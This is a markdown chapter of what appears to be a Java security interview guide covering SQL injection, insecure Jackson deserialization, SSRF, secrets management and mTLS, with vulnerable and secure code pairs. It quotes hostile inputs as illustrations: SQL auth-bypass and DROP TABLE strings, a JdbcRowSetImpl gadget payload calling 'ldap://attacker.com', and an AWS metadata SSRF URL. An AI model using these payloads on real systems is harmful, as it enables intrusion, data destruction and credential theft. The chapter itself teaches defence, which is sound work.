# 33. Enterprise Security, OWASP Top 10 for Java & Zero-Trust

> **Navigation**: [Master Index](README.md) | [Previous: Production Incidents](32_Production_Incident_PostMortems.md) | [Next: Build Tools & DevOps](34_Build_Tools_CI_CD_DevOps.md)

---

## 📌 Chapter Overview
This module explores **Enterprise Application Security**, vulnerabilities in the **OWASP Top 10 for Java** (In-Depth **SQL Injection in JDBC/JPA/ORDER BY**, **Insecure Deserialization**, **SSRF**, **CSRF**), **Secrets Management with HashiCorp Vault**, and **Mutual TLS (mTLS) Zero-Trust** architectures.

---

## 1. OWASP Top 10 Security Risks in Java

```
+-----------------------------------------------------------------------------------+
|                        OWASP TOP 10 SECURITY RISKS IN JAVA                        |
+-----------------------------------------------------------------------------------+
| 1. SQL Injection (SQLi)     -> Dynamic concatenation in JDBC, JPQL, & ORDER BY    |
| 2. Insecure Deserialization -> Jackson Polymorphic Gadget RCE Vulnerabilities     |
| 3. SSRF                     -> User-supplied URLs probing internal AWS metadata   |
| 4. Sensitive Data Exposure  -> Hardcoded secrets in git / logs printing PII data  |
| 5. CSRF vs JWT Confusion    -> Improper disabling of CSRF for cookie-based apps   |
+-----------------------------------------------------------------------------------+
```

---

## 2. Deep Dive: SQL Injection Prevention across Java & JPA

### Q1. How does SQL Injection occur in Java, and how do you prevent it across JDBC, JPQL, and dynamic `ORDER BY` clauses?
**Answer:**

#### 1. Classic JDBC: `Statement` vs. `PreparedStatement`
- **Vulnerable (`Statement`)**: Concatenating raw user strings into SQL queries allows attackers to break syntax (`' OR '1'='1`):
  ```java
  // ❌ VULNERABLE: Direct string concatenation
  String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
  Statement stmt = connection.createStatement();
  ResultSet rs = stmt.executeQuery(query); // Attacker passes "' OR '1'='1' --" to bypass auth!
  ```
- **Secure (`PreparedStatement`)**: The database compiles the SQL query structure *before* binding values. Parameter values are sent separately across the wire and treated purely as literal data, never as executable SQL commands:
  ```java
  // ✅ SECURE: Precompiled query with parameterized placeholders
  String query = "SELECT * FROM users WHERE username = ? AND password = ?";
  PreparedStatement pstmt = connection.prepareStatement(query);
  pstmt.setString(1, username);
  pstmt.setString(2, password);
  ResultSet rs = pstmt.executeQuery();
  ```

---

#### 2. JPA & Hibernate: JPQL / HQL Injection
- **Vulnerable JPQL**:
  ```java
  // ❌ VULNERABLE: String concatenation in JPQL/HQL
  public User findUser(String name) {
      String jpql = "SELECT u FROM User u WHERE u.username = '" + name + "'";
      return entityManager.createQuery(jpql, User.class).getSingleResult();
  }
  ```
- **Secure JPQL (Named Parameters)**:
  ```java
  // ✅ SECURE: Parameterized Named Query
  public User findUser(String name) {
      String jpql = "SELECT u FROM User u WHERE u.username = :name";
      return entityManager.createQuery(jpql, User.class)
          .setParameter("name", name)
          .getSingleResult();
  }
  ```

---

#### 3. Dynamic `ORDER BY` Clause Injection (Senior Gotcha!)
> [!WARNING]
> **Why `PreparedStatement` cannot protect `ORDER BY`**:
> SQL standards **do not allow parameter binding (`?`) for column names or sort directions**. 
> Writing `ORDER BY ?` binds a literal string constant, not a column identifier!

- **Vulnerable Dynamic Sort**:
  ```java
  // ❌ VULNERABLE: Attacker passes "id; DROP TABLE users; --" or "(CASE WHEN (SELECT ...)=1 THEN id ELSE price END)"
  String sql = "SELECT * FROM products ORDER BY " + sortBy;
  ```
- **Secure Whitelist / Spring Data Sort**:
  ```java
  // ✅ SECURE APPROACH A: Strict Whitelist Validation
  private static final Set<String> ALLOWED_SORT_COLUMNS = Set.of("id", "price", "created_at", "title");

  public List<Product> getProducts(String sortBy) {
      if (!ALLOWED_SORT_COLUMNS.contains(sortBy.toLowerCase())) {
          throw new IllegalArgumentException("Invalid sort column!");
      }
      return productRepo.findAll(Sort.by(Sort.Direction.ASC, sortBy));
  }
  ```

---

## 3. Insecure Deserialization & Jackson Polymorphic Typing

### Q2. Deep Dive: Why is Insecure Deserialization dangerous in Java & Jackson?
**Answer:**
- **Java Native Serialization (`ObjectInputStream.readObject()`)**: Deserializing untrusted byte streams allows attackers to trigger arbitrary method execution by invoking gadget chains (e.g., Apache Commons Collections RCE).
- **Jackson Polymorphic Typing (`@JsonTypeInfo`)**:
  If Jackson is configured with default typing (`enableDefaultTyping()`), JSON payloads containing class names (`["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker.com/obj"}]`) will instantiate malicious classes and execute remote code during JSON parsing!

#### Production Secure Jackson Pattern:
```java
// ✅ SECURE: Explicitly whitelist allowed polymorphic subtypes!
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = CreditCardPayment.class, name = "credit_card"),
    @JsonSubTypes.Type(value = BankTransferPayment.class, name = "bank_transfer")
})
public sealed interface PaymentDetails permits CreditCardPayment, BankTransferPayment {}
```

---

## 4. Server-Side Request Forgery (SSRF) Prevention

### Q3. What is Server-Side Request Forgery (SSRF) and how do you prevent it in Java?
**Answer:**
- **The Attack**: An endpoint accepts a URL parameter to fetch an image or webhook (`/fetch?url=http://169.254.169.254/latest/meta-data/`). The server fetches the URL and leaks sensitive AWS cloud IAM credentials to the attacker!
- **Prevention**: Validate URL protocols (allow only `https`), resolve IP addresses before connecting, and reject all **private/loopback ranges** (`127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`).

---

## 5. Secrets Management & Mutual TLS (mTLS)

```
+-------------------------------------------------------------------------------+
|                       ZERO-TRUST MUTUAL TLS (mTLS)                            |
+-------------------------------------------------------------------------------+
|  [ Order Service Pod ] <======== Encrypted & Mutually Verified ======> [ Pay Pod ]
|  - Presents Order TLS Certificate                     - Presents Pay TLS Cert
|  - Validates Pay TLS Certificate                      - Validates Order TLS Cert
|  * Even if an attacker enters the internal K8s network, they cannot spoof traffic!
+-------------------------------------------------------------------------------+
```

### Q4. How do you manage secrets securely in Spring Boot without hardcoding?
**Answer:**
1. **Never commit passwords/keys to Git**: Use environment variables or secret vaults.
2. **HashiCorp Vault / AWS Secrets Manager**: Use `spring-cloud-starter-vault-config` or Kubernetes CSI Secret Store driver to mount secrets as in-memory files at runtime.
3. **Log Sanitization**: Configure Logback masking patterns to redact credit cards, tokens, and PII in production logs.

---

> **Next Chapter**: [34 Build Tools, CI/CD Pipelines & Deployment Strategies](34_Build_Tools_CI_CD_DevOps.md)
